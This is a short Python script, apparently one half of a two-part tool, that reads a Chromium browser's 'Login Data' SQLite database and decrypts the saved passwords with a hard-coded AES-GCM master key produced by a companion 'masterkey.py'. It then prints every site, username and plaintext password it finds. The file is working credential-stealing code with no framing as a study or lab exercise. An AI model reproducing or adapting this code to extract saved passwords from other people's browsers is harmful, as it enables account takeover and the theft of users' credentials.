import sqlite3
import json
import base64
from Cryptodome.Cipher import AES

master_key = b'= \x11\xe0OI\xe0{e\x14[\xadj\xd2\xf7\xe6\xcaO\xe0C\xeb\x8ebp\x1b\r\x78\x17\x1dp\xba\xd9'  # the result of masterkey.py

def decrypt_password(encrypted_password, master_key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass.decode()
    except Exception:
        return "Error decrypting password"

db_path = "Login Data"  # مسیر فایل دیتابیس SQLite
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

for row in cursor.fetchall():
    site, username, encrypted_password = row
    decrypted_password = decrypt_password(encrypted_password, master_key)
    print(f"Site: {site}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}")

conn.close()
